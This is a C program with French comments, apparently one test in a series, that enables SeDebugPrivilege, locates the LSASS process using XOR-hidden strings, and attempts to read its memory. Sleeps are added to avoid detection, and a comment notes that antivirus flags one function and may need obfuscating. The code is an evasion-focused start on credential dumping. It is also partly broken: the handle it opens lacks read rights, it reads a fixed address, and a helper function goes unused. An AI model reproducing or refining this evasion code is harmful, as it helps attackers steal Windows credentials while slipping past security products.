#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <string.h>

// Test 8: Version obfusquée du dump LSASS
// Avec:
// - Délais
// - Strings XOR
// - Appels spacing

// XOR simple
void rox(char* d, size_t d_len, char* k, size_t k_len) {
        int j;

        j = 0;
        for (int i = 0; i < d_len; i++) {
                if (j == k_len - 1)
                        j = 0;

                d[i] = d[i] ^ k[j];
                j++;
        }
}

// Is flagged by Avira, maybe need to obfuscate this function
BOOL setPrivilege(LPCTSTR privilegeName) {
        HANDLE hToken = NULL;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                              &hToken)) {
                printf("OpenProcessToken failed");
                return FALSE;
        }

        LUID luid;
        if (!LookupPrivilegeValueA(NULL, privilegeName, &luid)) {
                printf("LookupPrivilegeValue failed");
                CloseHandle(hToken);
                return FALSE;
        }

        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        SetLastError(0);
        if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
                printf("AdjustTokenPrivileges failed");
                CloseHandle(hToken);
                return FALSE;
        }
        DWORD e = GetLastError();
        if (e == ERROR_NOT_ALL_ASSIGNED) {
                printf("failed");
                CloseHandle(hToken);
                return FALSE;
        }

        CloseHandle(hToken);
        return TRUE;
}
int main() {
        if (!setPrivilege(SE_DEBUG_NAME)) {
                printf("[-] Cannot enable SeDebugPrivilege\n");
                return 1;
        }
        printf("[+] SeDebugPrivilege enabled\n");
        printf("[*] Test 8: Obfuscated LSASS Memory Access\n");

        // Attendre au démarrage
        Sleep(2000);

        // String XOR: "lsass.exe" ^ 0x55
        char lsassName[] = {0x39, 0x26, 0x34, 0x26, 0x26, 0x7b, 0x30, 0x2d, 0x30, 0x00};

        // Déchiffrer avec la clé
        for (int i = 0; lsassName[i] != 0; i++) {
                lsassName[i] ^= 0x55; // Cycle à travers la clé
        }

        printf("[+] Target: %s\n", lsassName);
        Sleep(1000);

        // Énumération processus
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 pe = {};
        pe.dwSize = sizeof(PROCESSENTRY32);

        DWORD targetPID = 0;
        if (Process32First(snapshot, &pe)) {
                do {
                        Sleep(100); // Délai pour éviter détection

                        if (strcmp(pe.szExeFile, lsassName) == 0) {
                                targetPID = pe.th32ProcessID;
                                printf("[+] Found: PID %lu\n", targetPID);
                                break;
                        }
                } while (Process32Next(snapshot, &pe));
        }
        CloseHandle(snapshot);

        // Délai
        Sleep(1000);

        if (!targetPID) {
                printf("[-] Not found\n");
                return 1;
        }

        // String XOR: "ntdll.dll" ^ 0x55
        char dllName[] = {0x3b, 0x21, 0x31, 0x39, 0x39, 0x7b, 0x31, 0x39, 0x39, 0x00};
        // Déchiffrer avec la clé
        for (int i = 0; dllName[i] != 0; i++) {
                dllName[i] ^= 0x55; // Cycle à travers la clé
        }

        printf("[+] Target: %s\n", dllName);
        // Charger ntdll
        HMODULE hDll = LoadLibraryA(dllName);
        Sleep(500);

        // Ouvrir avec permissions réduites d'abord
        printf("[*] Opening with PROCESS_QUERY_INFORMATION...\n");
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPID);
        Sleep(500);

        if (!hProcess) {
                printf("[-] OpenProcess failed\n");
                return 1;
        }

        printf("[+] Got handle\n");

        // Délai
        Sleep(2000);

        // Lire une petite région
        printf("[*] Reading memory...\n");
        BYTE buffer[512] = {};
        SIZE_T bytesRead = 0;

        ReadProcessMemory(hProcess, (LPCVOID)0x400000, buffer, 512, &bytesRead);
        Sleep(500);

        printf("[+] Read %zu bytes\n", bytesRead);

        // Délai final
        Sleep(1000);

        CloseHandle(hProcess);
        printf("[+] Done\n");

        return 0;
}
